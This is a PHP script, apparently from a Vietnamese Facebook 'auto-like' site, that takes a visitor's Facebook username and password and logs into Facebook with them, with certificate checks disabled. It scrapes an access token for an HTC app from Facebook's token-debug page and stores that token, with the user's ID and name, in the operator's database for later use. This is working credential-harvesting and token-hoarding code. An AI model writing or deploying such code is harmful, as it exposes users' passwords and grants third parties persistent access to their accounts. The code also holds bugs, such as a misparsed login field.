<?php
session_start();
include'config.php';
if($_POST)
{
	
$username = $_POST['username']; 
$password = $_POST['password']; 

function grap_page($site){
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10');
curl_setopt($ch, CURLOPT_TIMEOUT, 40);
curl_setopt($ch, CURLOPT_COOKIEFILE, "lol.dh");
curl_setopt($ch, CURLOPT_URL, $site);
ob_start();
return curl_exec ($ch);
ob_end_clean();
curl_close ($ch);
} 
$curl = curl_init (); 
curl_setopt ( $curl, CURLOPT_URL, "http://m.facebook.com" );
curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, 1 ); 
curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 ); 
curl_setopt ( $curl, CURLOPT_ENCODING, "" ); 
curl_setopt ( $curl, CURLOPT_COOKIEJAR, getcwd () . '/lol.dh' );
curl_setopt ( $curl, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10" ); 
$Data = curl_exec ( $curl ); 
curl_close ( $curl ); 

$charsetTest = substr ( $Data, strpos ( $Data, "name=\"charset_test\"" ) );
$charsetTest = substr ( $charsetTest, strpos ( $charsetTest, "value=" ) + 7 );
$charsetTest = substr ( $charsetTest, 0, strpos ( $charsetTest, "\"" ) );

$locale = substr ( $Data, strpos ( $Data, "name=\"locale\"" ) );
$locale = substr ( $locale, strpos ( $locale, "value=" ) + 7 );
$locale = substr ( $locale, 0, strpos ( $locale, "\"" ) );

$lsd = substr ( $Data, strpos ( $Data, "name=\"locale\"" ) );
$lsd = substr ( $lsd, strpos ( $lsd, "value=" ) + 7 );
$lsd = substr ( $lsd, 0, strpos ( $lsd, "\"" ) );

$curl = curl_init ();
curl_setopt ( $curl, CURLOPT_URL, "https://login.facebook.com/login.php?login_attempt=1" );
curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, 1 );
curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt ( $curl, CURLOPT_POST, 1 );
curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, false );  
curl_setopt ( $curl, CURLOPT_POSTFIELDS, "charset_test=" . $charsetTest . "&locale=" . $locale . "&non_com_login=&email=" . $username . "&pass=" . $password . "&charset_test=" . $charsetTest . "&lsd=" . $lsd );
curl_setopt ( $curl, CURLOPT_ENCODING, "" );
curl_setopt ( $curl, CURLOPT_COOKIEFILE, getcwd () . '/lol.dh' ); 
curl_setopt ( $curl, CURLOPT_COOKIEJAR, getcwd () . '/lol.dh' ); 
curl_setopt ( $curl, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10" );
$Data2 = curl_exec ( $curl );
curl_close ( $curl );
if(!$username || !$password)
{
	die('<script>$(function (){ toastr.error("Vui Lòng Nhập Đầy Đủ Thông Tin","Không Thành Công!")});</script>');
}else{
$url = grap_page("https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424");
$start = 'required="1" name="q" value="';
$end = '" aria-label="Enter an access token to debug." aria-required="true" />';
$b = explode($start,$url);
$z = explode($end,$b[1]);
$accessToken = $z[0];

if($accessToken==false){
die('<script>$(function (){ toastr.error("Tài khoản không chính xác hoặc bạn chưa cài ứng dụng HTC")});</script>'); 
}else{
$row = null;
$check = json_decode(file_get_contents('https://graph.facebook.com/app/?access_token='.$accessToken.''), true);
$me = me($accessToken);
$_SESSION['name'] = $me[name];
$_SESSION['id'] = $me[id];
$_SESSION['token']   = $accessToken;
$_SESSION['birthday']=$me['birthday'];
$_SESSION['email']=$me['email'];
$_SESSION['first_name']=$me['first_name'];
$_SESSION['last_name']=$me['last_name'];
$_SESSION['gender']=$me['gender'];
$_SESSION['id_token'] = $check['id'];
mysql_query("CREATE TABLE IF NOT EXISTS `token` (

      `id` int(11) NOT NULL AUTO_INCREMENT,

      `user_id` varchar(32) NOT NULL,

      `name` varchar(32) NOT NULL,

      `access_token` varchar(255) NOT NULL,

      PRIMARY KEY (`id`)

      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

   ");
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         token
      WHERE
         user_id = '" . mysql_real_escape_string($me['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               token
            WHERE
               user_id='" . mysql_real_escape_string($me['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            token
         SET
            `user_id` = '" . mysql_real_escape_string($me['id']) . "',
            `name` = '" . mysql_real_escape_string($me['name']) . "',
            `access_token` = '" . mysql_real_escape_string($accessToken) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            token
         SET
            `access_token` = '" . mysql_real_escape_string($accessToken) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
   }
die('<script>$(function (){ toastr.success("Login thành công! <br>Đang chuyển hướng...")}); window.location.href = "index.php?info=success"</script>');
}
}
function me($access) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$access),true);
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>